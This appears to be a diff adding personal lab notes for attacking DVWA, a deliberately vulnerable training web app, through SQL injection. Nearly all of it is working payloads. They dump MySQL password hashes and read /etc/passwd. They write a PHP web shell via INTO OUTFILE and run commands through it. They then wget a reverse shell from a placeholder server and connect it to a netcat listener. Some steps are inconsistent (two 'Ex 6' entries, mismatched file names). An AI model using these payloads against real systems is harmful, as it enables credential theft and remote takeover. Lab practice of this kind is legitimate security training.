@@ -1,0 +1,60 @@
+DVWA Prep:
+1) sudo apt-get install vim
+2) vim /opt/lampp/htdocs/vulnerabilities/sqli/index.php
+	line 52: <input size=\”100\” …
+3) adduser apache
+4) modify /opt/lampp/etc/httd.conf to User: apache; Group; apache
+
+
+Examples - DVWA
+
+Ex 1: Simple true statement with statement termination
+		
+	1' OR 1=1; # 
+
+	Notice record count is not filtered
+
+Ex 2: Column Count
+	Error: 
+		1' UNION SELECT 1; # 
+		Notice the column count error
+	
+	Resolved: 
+		1' UNION SELECT 1,2; #  
+		Notice the result and location of numbers	
+
+Ex 3: Union to pull information about the DB
+	0' UNION SELECT user(),database(); #  
+
+Ex 4: DB Password Hashes
+	0' UNION SELECT CONCAT(user,' : ',password),host FROM mysql.user; #  
+	Note: root present, possibly the same password for the server.
+
+Ex 5: File System Access
+	0' UNION SELECT load_file('/etc/passwd'),2; #  
+	http://dvwa/vulnerabilities/sqli/?id=0'%20UNION%20SELECT%20load_file('/etc/passwd'),2;%20--%20&Submit=Submit#
+
+Ex 6: Remote Execution (This one seems to have quote issues)
+	0' UNION SELECT “<code><?php system($_REQUEST[\'cmd\']) ?></code>”,”” INTO OUTFILE “/opt/lampp/htdocs/hackable/uploads/c.php”; #  
+
+0' UNION SELECT '<code><?php system($_REQUEST[\'cmd\']) ?></code>','' INTO OUTFILE '/opt/lampp/htdocs/hackable/uploads/c.php'; #  
+
+http://dvwa/vulnerabilities/sqli/?id=0'+UNION+SELECT+'<pre><%3Fphp+system(%24_REQUEST[\'cmd\'])+%3F><%2Fpre>'%2C''+INTO+OUTFILE+'%2Fopt%2Flampp%2Fhtdocs%2Fhackable%2Fuploads%2Fc.php'%3B+%23++&Submit=Submit#
+
+	http://dvwa/hackable/uploads/c.php?cmd=uname -a
+	http://dvwa/hackable/uploads/c.php?cmd=pwd
+	http://dvwa/hackable/uploads/c.php?cmd=pwd
+
+Ex 6: Reverse Shell
+	Local:
+		nc -vnlp 4447
+	Remote:
+		Download reverse shell
+			http://dvwa/hackable/uploads/c.php?cmd=wget%20http://<SERVER>/rshell.php.txt
+
+		Rename rshell.php.txt to rshell.php
+			http://dvwa/hackable/uploads/c.php?cmd=mv%20rshell.txt%20rshell.php
+
+		Connect to remote listener
+			http://dvwa/hackable/uploads/rshell.php?addr=172.16.233.1&port=4447
+
